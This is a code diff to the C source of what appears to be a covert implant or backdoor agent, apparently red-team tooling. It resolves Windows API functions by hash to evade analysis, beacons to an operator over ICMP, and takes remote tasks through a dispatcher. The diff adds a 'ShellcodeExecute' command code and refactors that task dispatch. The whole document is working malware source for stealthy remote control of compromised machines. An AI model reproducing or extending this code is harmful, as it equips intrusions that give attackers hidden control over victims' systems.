@@ -16,7 +16,7 @@ typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
 	UINT32	TaskId;
 	UINT32	Length;
 	UCHAR	Buffer[0];
-} CMD_REQUEST_HDR, *PCMD_REQUEST_HDR ;
+} CMD_REQ_HDR, *PCMD_REQ_HDR ;
 
 typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
 {
@@ -24,7 +24,14 @@ typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
 	UINT32	ReturnCode;
 	UINT32	ErrorValue;
 	UCHAR	Buffer[0];
-} CMD_RETURN_HDR, *PCMD_RETURN_HDR ;
+} CMD_RET_HDR, *PCMD_RET_HDR ;
+
+typedef enum
+{
+	Hello = 0,
+	ExitFree = 1,
+	ShellcodeExecute = 2
+} CMD ;
 
 typedef struct
 {
@@ -51,19 +58,17 @@ typedef struct
 D_SEC( B ) VOID WINAPI Entry( VOID )
 {
 	API		Api;
-	CMD_REQUEST_HDR	Req;
-	CMD_RETURN_HDR	Ret;
 
-	BOOL		Res = FALSE;
 	BOOL		Rcv = FALSE;
+	DWORD		Res = 0;
 	PBUFFER		Inb = NULL;
 	PBUFFER		Onb = NULL;
 	PROGUE_CTX	Ctx = NULL;
+	PCMD_REQ_HDR	Req = NULL;
+	PCMD_RET_HDR	Ret = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Req, sizeof( Req ) );
-	RtlSecureZeroMemory( &Ret, sizeof( Ret ) );
 
 	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
@@ -80,11 +85,17 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 			/* Append the starting ID */
 			if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
 
-				/* Append response task header */
-				if ( BufferAddRaw( Onb, &Ret, sizeof( Ret ) ) ) {
+				/* Extend to support size of the return header */
+				if ( BufferExtend( Onb, sizeof( CMD_RET_HDR ) ) ) {
+
+					/* Set return buffer header */
+					Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
+					Ret->TaskId     = 0;
+					Ret->ReturnCode = 0;
+					Ret->ErrorValue = 0;
 
 					/* Execute "Hello" */
-					if ( TaskHello( NULL, 0, Onb ) ) {
+					if ( TaskHello( Ctx, NULL, 0, Onb ) ) {
 						/* Change the IP to be configurable */
 						Ctx->Established = IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
 					};
@@ -94,6 +105,8 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 			/* Cleanup */
 			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb->Buffer );
 			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb );
+
+			/* Reset variables */
 			Onb = NULL;
 		};
 
@@ -106,7 +119,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Read in the incoming buffer */
 					if ( IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
 						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
-							if ( Inb->Length >= sizeof( CMD_REQUEST_HDR ) ) {
+							if ( Inb->Length >= sizeof( CMD_REQ_HDR ) ) {
 
 								/* Prepare the stack structures */
 								RtlSecureZeroMemory( &Req, sizeof( Req ) );
@@ -117,35 +130,42 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 								/* Create an output buffer */
 								if ( ( Onb = BufferCreate() ) != NULL ) {
-									switch ( Req.TaskCode ) {
-										case 0:
-											/* Command: COMMAND_HELLO */
-											if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
-												/* Set Information about the task */
-												Ret.TaskId     = Req.TaskId;
-												Ret.ErrorValue = NtCurrentTeb()->LastErrorValue;
-												Ret.ReturnCode = FALSE;
+									/* Add the ID to the front of the buffer */
+									if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
+										/* Add the return header to the front */
+										if ( BufferExtend( Onb, sizeof( CMD_RET_HDR ) ) ) {
+											Req = C_PTR( Inb->Buffer );
 
-												/* Append information about the task */
-												if ( BufferAddRaw( Onb, &Ret, sizeof( Ret ) ) ) {
-													PCMD_RETURN_HDR		Bf1 = NULL;
-													PCMD_REQUEST_HDR	Bf2 = NULL;
+											switch( Req->TaskCode ) {
+												case Hello:
+													/* Execute TaskHello */
+													Res = TaskHello( Ctx, Req->Buffer, Req->Length, Onb );
+													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 
-													/* Set pointers */
-													Bf2 = C_PTR( Inb->Buffer );
-													Bf1 = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
+													/* Set return info */
+													Ret->TaskId = Req->TaskId;
+													Ret->ReturnCode = Res;
+													Ret->ErrorValue = NtCurrentTeb()->LastErrorValue;
 
-													/* Set return error value */
-													Bf1->ReturnCode = TaskHello( Bf2->Buffer, Bf2->Length, Onb );
-													Bf1->ErrorValue = NtCurrentTeb()->LastErrorValue;
-
-													/* Dispatch the response */
+													/* Dispatch response */
 													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
-												};
-											};
-											break;
-									};
+													break;
+												case ExitFree:
+													/* Execute TaskExitFree */
+													Ctx->Established = FALSE;
+													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 
+													/* Set return info */
+													Ret->TaskId     = Req->TaskId;
+													Ret->ReturnCode = 0;
+													Ret->ErrorValue = 0;
+
+													/* Dispatch response */
+													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
+													break;
+											};
+										};
+									}
 									/* Cleanup */
 									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb->Buffer );
 									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb );
@@ -165,7 +185,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					Inb = NULL; Rcv = FALSE;
 				};
 				/* ah shit!: insert obfuscate/sleep call here */
-				( ( __typeof__( Sleep ) * ) PeGetFuncEat( PebGetModule( 0x6ddb9555 ), 0xe07cd7e ) )( 20000 );
+				if ( Ctx->Established != FALSE ) ( ( __typeof__( Sleep ) * ) PeGetFuncEat( PebGetModule( 0x6ddb9555 ), 0xe07cd7e ) )( 20000 );
 			};
 		};
 
@@ -176,6 +196,4 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Req, sizeof( Req ) );
-	RtlSecureZeroMemory( &Ret, sizeof( Ret ) );
 };
